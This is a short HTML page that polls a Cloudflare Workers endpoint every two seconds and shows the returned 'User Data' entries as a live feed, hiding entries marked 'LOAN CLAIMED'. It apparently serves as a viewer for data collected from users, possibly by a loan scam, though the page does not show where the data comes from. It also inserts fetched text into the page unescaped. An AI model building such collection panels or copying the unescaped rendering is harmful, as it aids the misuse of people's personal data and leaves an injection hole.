<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TERMINAL - LIVE</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background-color: #ffffff; 
            padding: 8px; 
            font-family: 'Consolas', 'Courier New', monospace; 
        }
        
        /* Header Section */
        .header { 
            background: #f8f9fa; 
            color: #333; 
            padding: 12px; 
            font-size: 11px; 
            font-weight: bold; 
            border-radius: 4px;
            margin-bottom: 12px; 
            display: flex; 
            justify-content: space-between;
            align-items: center;
            border: 1px solid #eee;
        }

        /* Red Bold Number on Top Right */
        #count {
            color: #ff0000; 
            font-size: 18px; 
            font-weight: 900;
        }

        .status-dot { color: #00a859; animation: blink 1s infinite; margin-right: 5px; }
        @keyframes blink { 50% { opacity: 0; } }

        /* Full Screen Black Card - Ultra Patla */
        .log-card { 
            background: #000000; 
            margin-bottom: 6px; 
            padding: 10px 15px; 
            border-radius: 3px;
            width: 100%;
            display: flex;
            flex-direction: column;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }

        /* White Data Text - Example: User id:- aman */
        .detail-text { 
            color: #ffffff; 
            font-size: 13px; 
            white-space: pre-wrap; 
            line-height: 1.6;
            word-break: break-all;
            letter-spacing: 0.5px;
        }

        /* Meta Info (ID & Time) */
        .meta { 
            display: block; 
            margin-top: 6px; 
            font-size: 9px; 
            color: #666; 
            text-align: right;
            border-top: 1px solid #1a1a1a;
            padding-top: 5px;
        }

        #logsContainer { width: 100%; }
        .loading { font-size: 12px; color: #aaa; text-align: center; margin-top: 30px; }
    </style>
</head>
<body>

    <div class="header">
        <span><span class="status-dot">●</span> LIVE_FEED</span>
        <span id="count">0</span>
    </div>

    <div id="logsContainer">
        <p class="loading">Fetching Data...</p>
    </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';

        async function fetchLogs() {
            try {
                const response = await fetch(`${workerURL}?t=${Date.now()}`);
                const data = await response.json();
                
                const container = document.getElementById('logsContainer');
                
                // Sirf wahi data filter kar rahe hain jo "LOAN CLAIMED" wala nahi hai
                const filteredData = data.filter(item => {
                    return item.detail && !item.detail.includes("LOAN CLAIMED");
                });

                document.getElementById('count').innerText = filteredData.length;

                if (filteredData.length === 0) {
                    container.innerHTML = "<p class='loading'>No User Data Found.</p>";
                    return;
                }

                container.innerHTML = filteredData.map(item => `
                    <div class="log-card">
                        <div class="detail-text">${item.detail}</div>
                        <div class="meta">ID:${item.id} | ${item.time}</div>
                    </div>
                `).join('');

            } catch (err) {
                console.error("Sync Error");
            }
        }

        // 2 Second Auto-Update
        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
